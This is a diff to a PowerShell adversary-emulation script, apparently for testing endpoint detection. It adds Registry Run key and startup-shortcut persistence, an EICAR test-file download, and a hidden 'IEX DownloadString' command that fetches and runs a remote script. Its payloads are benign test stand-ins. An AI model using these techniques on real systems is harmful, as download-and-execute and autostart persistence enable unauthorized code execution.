@@ -106,11 +106,10 @@ Remove-Item test.txt -Force -ea 0
 Write-Host -ForegroundColor Cyan "`n`nStarting Foothold / Persistence Step"
 
 Write-Host "Autostart locations like Registry Run Keys or files in User Startup Folders will cause that program to execute when a user logs in or the system reboots. Each autostart may have it’s own trigger for automated execution.`n"
-Write-Host "Adding T1547.001 - Registry Run Key Foothold"
+Write-Host "Adding T1547.001 - Registry Run Key Foothold w/ undetectable malware (calc)"
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe -i $n"
 Start-Sleep 2
 #REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f >nul 2>&1
-
 
 Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
 $subcmd = 'powershell.exe -command "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`");"'
@@ -123,21 +122,29 @@ powershell.exe -Win N -exec bypass -nop -command $cmd
 #Start-Sleep 2
 #Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
 
-Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence"
+Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence with detectable malware (EICAR File)"
+Write-Host "Downloading IECAR file..."
+Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "$attackDir\EICAR.exe"
 $cmd = @'
-$Target = "C:\Windows\System32\calc.exe"
+$Target = "$attackDir\EICAR.exe"
+#$Target = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\EICAR.exe"
 $ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
+$Create.TargetPath = $Target
+$Create.Save()
+$ShortcutLocation = "$home\Desktop\evil_calc.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
 $Create.TargetPath = $Target
 $Create.Save()
 '@
 $cmd += "`nStart-Sleep -m $n"
-Start-Sleep -m $n
 powershell.exe -Win N -exec bypass -nop -command $cmd
-
-#Start-Sleep 2
+Start-Sleep 2
+#Remove-Item "$attackDir\EICAR.exe" -Force
 #Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk" -ErrorAction Ignore
+#Remove-Item "$home\Desktop\evil_calc.lnk" -ErrorAction Ignore
 
 
 
@@ -255,4 +262,4 @@ sc config WinDefend start= Auto
 sc start WinDefend
 Set-MpPreference -DisableRealtimeMonitoring $false
 
-Remove-Item -Path $attackDir -Recurse -force -ea 0
+#Remove-Item -Path $attackDir -Recurse -force -ea 0
